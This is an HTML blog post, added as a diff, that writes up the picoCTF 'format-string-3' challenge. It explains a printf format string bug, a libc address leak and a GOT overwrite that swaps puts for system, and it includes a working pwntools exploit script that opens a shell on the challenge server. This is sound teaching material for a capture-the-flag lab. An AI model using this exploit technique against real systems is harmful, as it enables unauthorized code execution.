@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="how to make your program spill tea">
+  <title>how to make your program spill tea - ~siddharth~</title>
+  <link rel="stylesheet" href="../style.css">
+  <style>
+    /* Blog specific styles */
+    .blog-content { font-family: "Verdana", sans-serif; line-height: 1.6; font-size: 14px; }
+    .blog-content h1, .blog-content h2, .blog-content h3 { color: #000080; margin-top: 20px; border-bottom: 1px dotted #ccc; padding-bottom: 5px; }
+    .blog-content p { margin-bottom: 15px; }
+    .blog-content img { max-width: 100%; border: 1px solid #999; padding: 4px; background: #fff; }
+    .blog-content .img-container { text-align: center; margin: 20px 0; }
+    .blog-content pre { background: #eee; border: 1px inset #ccc; padding: 10px; overflow-x: auto; font-family: "Courier New", monospace; }
+    .blog-content code { background: #f0f0f0; padding: 2px 4px; font-family: "Courier New", monospace; }
+    .blog-content blockquote { border-left: 4px solid #000080; padding-left: 10px; color: #555; font-style: italic; margin: 15px 0; }
+    .blog-meta { color: #666; font-size: 11px; margin-bottom: 20px; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
+  </style>
+</head>
+<body>
+
+<div class="top-banner">
+  <marquee behavior="scroll" direction="left" scrollamount="3">
+    *** Reading: how to make your program spill tea *** Post Date: 2025-12-17 ***
+  </marquee>
+</div>
+
+<table class="main-table" cellpadding="0" cellspacing="0">
+  <tr>
+    <td class="sidebar" valign="top">
+      <div class="sidebar-box">
+        <div class="sidebar-title">Navigation</div>
+        <ul class="nav-list">
+          <li><a href="../index.html">[ Home ]</a></li>
+          <li><a href="../about.html">[ About Me ]</a></li>
+          <li><a href="../projects.html">[ Projects ]</a></li>
+          <li><a href="../blog.html">[ Blog ]</a></li>
+
+        </ul>
+      </div>
+      
+      <div class="sidebar-box">
+        <div class="sidebar-title">Actions</div>
+        <ul class="nav-list">
+          <li><a href="javascript:history.back()">&lt;&lt; Go Back</a></li>
+          <li><a href="#">Top of Page</a></li>
+        </ul>
+      </div>
+    </td>
+
+    <td class="content" valign="top">
+      <div class="page-header">
+        <h1>how to make your program spill tea</h1>
+        <hr class="fancy-hr">
+      </div>
+
+      <p class="breadcrumb"><a href="../index.html">Home</a> &gt; <a href="../blog.html">Blog</a> &gt; how to make your program spill tea</p>
+
+      <div class="content-box">
+        <div class="blog-meta">
+           <strong>Date:</strong> 2025-12-17 | <strong>Tags:</strong> 
+        </div>
+        
+        <div class="blog-content">
+          <div class="img-container"><img src="../images/posts/format-string-3/fmt-str-chal.png" alt="Format String Challenge"></div>
+<h2>Introduction</h2>
+<p>
+In this challenge, we are tasked with exploiting a binary named <strong>format-string-3</strong>. We are provided with the following artifacts:
+</p>
+<ul><li><strong>format-string-3</strong>: The target ELF binary.</li><li><strong>libc.so.6</strong>: The standard C library used by the binary.</li><li><strong>ld-linux-x86-64.so.2</strong>: The dynamic linker.</li><li><strong>format-string-3.c</strong>: The source code.</li></ul>
+<p>
+Our goal is to analyze the binary's behavior, identify a vulnerability, and exploit it to spawn a shell.
+</p>
+<h2>Source Code Analysis</h2>
+<p>
+Let's examine the provided source code, specifically the <code>main()</code> function:
+</p>
+<pre class="code-block"><code>int main() {
+    char *all_strings[MAX_STRINGS] = {NULL};
+    char buf[1024] = {'\0'};
+
+    setup();
+    hello();    
+
+    fgets(buf, 1024, stdin);    
+    printf(buf);
+
+    puts(normal_string);
+
+    return 0;
+}
+</code></pre>
+<p>
+Two critical things happen here:
+</p>
+<p>
+1.  <strong>Vulnerable <code>printf</code></strong>: <code>printf(buf)</code> prints user input directly without a format specifier (like <code>%s</code>). This allows us to supply our own format specifiers (e.g., <code>%x</code>, <code>%p</code>, <code>%n</code>) to read from or write to the stack and arbitrary memory locations.
+2.  <strong>Target Function</strong>: The program ends by calling <code>puts(normal_string)</code>, where <code>normal_string</code> is <code>"/bin/sh"</code>.
+</p>
+<p>
+If we can manipulate the program so that <code>puts</code> is replaced by <code>system</code>, the call <code>puts("/bin/sh")</code> effectively becomes <code>system("/bin/sh")</code>, giving us a shell.
+</p>
+<h3>The Leak</h3>
+<p>
+Before <code>main</code> processes our input, the <code>hello()</code> function is called:
+</p>
+<pre class="code-block"><code>void hello() {
+    puts("Howdy gamers!");
+    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &amp;setvbuf);
+}
+</code></pre>
+<p>
+This function helpfully prints the runtime address of <code>setvbuf</code>. This is crucial because modern systems use <strong>ASLR (Address Space Layout Randomization)</strong> and <strong>PIE (Position Independent Executable)</strong>, meaning memory addresses change every time the program runs.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-1.png" alt="Leak Output"></div>
+<p>
+By knowing the runtime address of <code>setvbuf</code> and its static offset in the provided <code>libc.so.6</code>, we can calculate the <strong>base address of libc</strong>. Once we have the base address, we can find the runtime address of any other function in libc, including <code>system</code>.
+</p>
+<h2>Vulnerability & Strategy</h2>
+<h3>The Plan</h3>
+<p>
+1.  <strong>Capture the Leak</strong>: Read the address of <code>setvbuf</code> from the program's initial output.
+2.  <strong>Calculate Addresses</strong>:
+*   Compute libc base: <code>libc_base = setvbuf_leak - setvbuf_offset</code>
+*   Compute <code>system</code> address: <code>system_addr = libc_base + system_offset</code>
+3.  <strong>Overwrite GOT</strong>: Use the format string vulnerability in <code>printf(buf)</code> to overwrite the <strong>Global Offset Table (GOT)</strong> entry for <code>puts</code> with the address of <code>system</code>.
+</p>
+<h3>Understanding the GOT/PLT</h3>
+<p>
+The <strong>Global Offset Table (GOT)</strong> is used by dynamically linked programs to resolve function addresses at runtime. When <code>puts</code> is called, the program looks up its address in the GOT. If we overwrite that entry with the address of <code>system</code>, the program will jump to <code>system</code> instead.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-3.png" alt="Program Segfaults on Bad Input"></div>
+<p>
+<em>Figure: We can verify control over execution flow by crashing the program.</em>
+</p>
+<h2>Debugging & Exploitation</h2>
+<p>
+To verify our strategy, we can use GDB. We need to find the location of <code>puts</code> in the GOT.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-5.png" alt="GDB Disassembly"></div>
+<p>
+In GDB, we can inspect the PLT and GOT entries. The disassembly shows calls to <code>puts@plt</code>, which eventually jumps to the address stored in <code>puts@got</code>.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-6.png" alt="GDB PLT Analysis"></div>
+<h3>Calculating Offsets</h3>
+<p>
+Since we have the <code>libc.so.6</code> file, the offsets are static. We can calculate the distance between <code>setvbuf</code> and <code>system</code> beforehand or let <code>pwntools</code> handle it dynamically.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-7.png" alt="Offset Calculation"></div>
+<h2>The Exploit Script</h2>
+<p>
+We'll use <strong>pwntools</strong> to automate the interaction. It handles the arithmetic, format string payload generation, and communication.
+</p>
+<pre class="code-block"><code>from pwn import *
+
+# Context setup
+context.binary = ELF('./format-string-3')
+context.update(arch='amd64', os='linux', bits=64)
+elf = context.binary
+libc = ELF('./libc.so.6') # Load the provided libc
+
+HOST, PORT = 'rhea.picoctf.net', 60973
+REMOTE = True
+
+# Start process or connect to remote
+s = remote(HOST, PORT) if REMOTE else elf.process()
+
+# 1. Parse the leak
+s.recvuntil(b"libc: ")
+leak_line = s.recvline().strip()
+setvbuf_addr = int(leak_line, 16)
+log.info(f"Leaked setvbuf: {hex(setvbuf_addr)}")
+
+# 2. Calculate base and system address
+libc.address = setvbuf_addr - libc.symbols['setvbuf']
+system_addr = libc.symbols['system']
+log.info(f"Libc Base: {hex(libc.address)}")
+log.info(f"System Address: {hex(system_addr)}")
+
+# 3. Overwrite puts@got with system
+# We use pwntools' fmtstr_payload to automatically generate the write payload
+puts_got = elf.got['puts']
+
+# FmtStr helper to find the offset automatically (optional, usually 6 or 8 on 64-bit)
+# For this challenge, we can likely assume standard offsets or find it manually.
+# Let's assume we found the format string offset is 38 (based on challenge context).
+format_string_offset = 38 
+
+payload = fmtstr_payload(format_string_offset, {puts_got: system_addr})
+
+s.sendline(payload)
+s.interactive()
+</code></pre>
+<h3>Running the Exploit</h3>
+<p>
+When we run the script:
+1.  It catches the <code>setvbuf</code> leak.
+2.  Calculates the address of <code>system</code>.
+3.  Sends a payload that writes the <code>system</code> address into the <code>puts</code> GOT entry.
+4.  When <code>puts("/bin/sh")</code> is called next, <code>system("/bin/sh")</code> executes instead.
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-8.png" alt="Final Shell"></div>
+<p>
+And just like that, we have a shell!
+</p>
+<div class="img-container"><img src="../images/posts/format-string-3/fmt-str-10.png" alt="Success Meme"></div>
+<p>
+<strong>References:</strong>
+</p>
+<ul><li><a href="https://nuc13us.wordpress.com/2015/12/25/hack-using-global-offset-table/">Hack Using Global Offset Table</a></li></ul>
+        </div>
+      </div>
+
+    </td>
+  </tr>
+</table>
+
+<div class="footer">
+  <hr class="fancy-hr">
+  <p>&#169; 2026 Siddharth | <a href="../index.html">Back to Home</a></p>
+</div>
+
+</body>
+</html>
